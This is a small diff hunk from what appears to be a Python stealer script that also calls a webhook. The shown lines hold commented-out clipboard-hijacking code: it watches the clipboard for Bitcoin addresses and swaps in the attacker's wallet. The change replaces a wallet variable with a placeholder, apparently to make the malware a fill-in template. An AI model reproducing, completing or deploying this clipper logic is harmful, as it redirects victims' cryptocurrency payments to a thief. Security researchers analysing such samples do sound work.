@@ -659,6 +659,6 @@ webhook.execute()
 #         clipboarddata = pyperclip.paste()
 #         ourbtc = re.search(r'^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,}$', clipboarddata)
 #         if ourbtc:
-#            pyperclip.copy(f"{btc_wallet}")
+#            pyperclip.copy("YourBTCWALLETaddress")
 #     except pyperclip.PyperclipException:
 #        pass   
